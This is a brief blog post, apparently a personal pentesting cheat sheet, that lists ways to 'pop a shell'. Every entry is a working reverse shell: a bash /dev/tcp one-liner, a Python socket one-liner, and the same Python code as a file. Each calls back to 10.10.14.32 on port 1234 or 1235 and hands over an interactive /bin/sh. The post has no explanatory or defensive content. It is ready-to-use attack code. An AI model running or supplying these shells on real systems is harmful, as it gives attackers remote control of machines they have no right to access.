---
title: "Popping a Shell!"
date: 2021-02-10T17:23:05+01:00
categories: []
tags: []
---

A few ways to pop a shell...

* `/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.32/1234 0>&1'`

* `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.32",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

* Python in a file :
```text
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.32",1235))
os.dup2(s.fileno(),0) 
os.dup2(s.fileno(),1) 
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```
